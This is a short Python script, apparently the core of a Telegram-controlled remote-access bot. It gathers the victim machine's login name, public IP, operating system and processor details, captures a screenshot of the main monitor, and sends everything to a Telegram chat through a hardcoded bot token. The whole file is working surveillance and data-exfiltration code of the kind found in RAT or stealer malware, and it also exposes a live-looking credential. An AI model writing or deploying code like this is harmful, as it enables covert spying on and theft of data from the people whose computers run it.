import os, requests, platform
import telebot as tb
import mss
import mss.tools

tb_token = '1693437075:AAFLgkYejKfDYTM6cy9ktiYpvGKpKCIjlYY'
bot = tb.TeleBot(tb_token)


def pc_info(message):
    username = os.getlogin()
    r = requests.get('https://ip.42.pl/raw')
    user_ip = r.text
    system_name = platform.platform()
    processor = platform.processor()
    os_version = platform.version()
    bot.send_message(message.from_user.id,
                     "Name: " + username
                     + "\nIP: " + user_ip
                     + "\nOS: " + system_name
                     + "\nProcessor: " + processor
                     + "\nOS version: " + os_version)


def get_screenshot(message):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Use the 1st monitor
        im = sct.grab(monitor)  # Grab the picture
        raw_screenshot = mss.tools.to_png(im.rgb, im.size)
        bot.send_photo(message.from_user.id, raw_screenshot)
